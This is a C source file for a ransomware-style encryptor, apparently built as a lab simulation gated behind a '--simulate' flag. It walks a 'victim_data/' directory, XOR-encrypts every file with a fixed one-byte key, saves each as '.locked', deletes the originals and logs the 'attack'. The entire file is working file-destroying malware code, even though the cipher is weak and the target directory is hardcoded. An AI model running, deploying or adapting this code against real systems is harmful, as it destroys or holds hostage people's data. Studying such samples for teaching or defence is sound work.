#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include "banner.h"

#define TARGET_DIR "victim_data/"
#define EXTENSION ".locked"
#define XOR_KEY 0x5A

void xor_encrypt(const char *input_path);
int ends_with(const char *str, const char *suffix);

int main(int argc, char *argv[])
{
    print_banner("encryptor");

    if (argc < 2 || strcmp(argv[1], "--simulate") != 0)
    {
        fprintf(stderr, "Usage: %s --simulate\n", argv[0]);
        return EXIT_FAILURE;
    }

    DIR *dir;
    struct dirent *entry;
    dir = opendir(TARGET_DIR);
    if (!dir)
    {
        perror("opendir");
        return EXIT_FAILURE;
    }

    FILE *log = fopen("attack.log", "a");
    if (!log)
    {
        perror("fopen log");
        closedir(dir);
        return EXIT_FAILURE;
    }

    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        if (ends_with(entry->d_name, EXTENSION))
            continue;

        char path[256];
        size_t needed = strlen(TARGET_DIR) + strlen(entry->d_name) + 1;
        if (needed >= sizeof(path)) continue;

        snprintf(path, sizeof(path), "%s%s", TARGET_DIR, entry->d_name);
        xor_encrypt(path);
        fprintf(log, "[*] Encrypted: %s\n", entry->d_name);
    }

    fprintf(log, "[+] Simulation completed.\n");
    fclose(log);
    closedir(dir);

    return EXIT_SUCCESS;
}

void xor_encrypt(const char *input_path) {
    FILE *in = fopen(input_path, "rb");
    if (!in) return;

    char output_path[256];
    size_t needed = strlen(input_path) + strlen(EXTENSION) + 1;
    if (needed >= sizeof(output_path)) {
        fclose(in);
        return;
    }

    snprintf(output_path, sizeof(output_path), "%s%s", input_path, EXTENSION);

    FILE *out = fopen(output_path, "wb");
    if (!out) {
        fclose(in);
        return;
    }

    int c;
    while ((c = fgetc(in)) != EOF) {
        fputc(c ^ XOR_KEY, out);
    }

    fclose(in);
    fclose(out);

    remove(input_path);
}

int ends_with(const char *str, const char *suffix)
{
    if (!str || !suffix) return 0;
    size_t len_str = strlen(str);
    size_t len_suf = strlen(suffix);
    if (len_suf > len_str) return 0;
    return strcmp(str + len_str - len_suf, suffix) == 0;
}